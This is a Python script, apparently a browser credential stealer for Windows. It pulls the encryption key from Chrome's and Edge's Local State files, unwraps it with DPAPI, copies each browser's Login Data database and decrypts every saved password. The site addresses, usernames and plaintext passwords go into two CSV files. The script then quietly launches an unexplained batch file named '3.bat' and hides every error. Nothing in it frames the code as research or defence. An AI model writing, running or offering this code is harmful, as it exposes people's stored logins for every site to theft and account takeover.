import subprocess
import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

# GLOBAL CONSTANTS
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
EDGE_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Local State"%(os.environ['USERPROFILE']))
EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data"%(os.environ['USERPROFILE']))

def get_secret_key(chrome=True):
    try:
        if chrome:
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
        else:
            with open(EDGE_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
                
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]  # remove suffix DPAPI
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password).decode()  
        return decrypted_pass
    except Exception as e:
        return ""

def get_db_connection(chrome=True):
    try:
        if chrome:
            chrome_path_login_db = os.path.normpath(r"%s\Default\Login Data"%(CHROME_PATH))
        else:
            chrome_path_login_db = os.path.normpath(r"%s\Default\Login Data"%(EDGE_PATH))
            
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None
    
def run_batch_script():
    try:
        subprocess.call(['3.bat'], shell=True)
    except Exception as e:
        pass

if __name__ == '__main__':
    try:
        # Chrome
        with open('01.csv', mode='w', newline='', encoding='utf-8') as chrome_decrypt_password_file:
            chrome_csv_writer = csv.writer(chrome_decrypt_password_file, delimiter=',')
            chrome_csv_writer.writerow(["index","url","username","password"])
            chrome_secret_key = get_secret_key(chrome=True)
            chrome_conn = get_db_connection(chrome=True)
            
            if chrome_secret_key and chrome_conn:
                chrome_cursor = chrome_conn.cursor()
                chrome_cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for index, login in enumerate(chrome_cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, chrome_secret_key)
                        chrome_csv_writer.writerow([index, url, username, decrypted_password])
                
                chrome_cursor.close()
                chrome_conn.close()
                os.remove("Loginvault.db")

        # Microsoft Edge
        with open('02.csv', mode='w', newline='', encoding='utf-8') as edge_decrypt_password_file:
            edge_csv_writer = csv.writer(edge_decrypt_password_file, delimiter=',')
            edge_csv_writer.writerow(["index","url","username","password"])
            edge_secret_key = get_secret_key(chrome=False)
            edge_conn = get_db_connection(chrome=False)
            
            if edge_secret_key and edge_conn:
                edge_cursor = edge_conn.cursor()
                edge_cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for index, login in enumerate(edge_cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, edge_secret_key)
                        edge_csv_writer.writerow([index, url, username, decrypted_password])
                
                edge_cursor.close()
                edge_conn.close()
                os.remove("Loginvault.db")

        run_batch_script()
    except Exception as e:
        pass
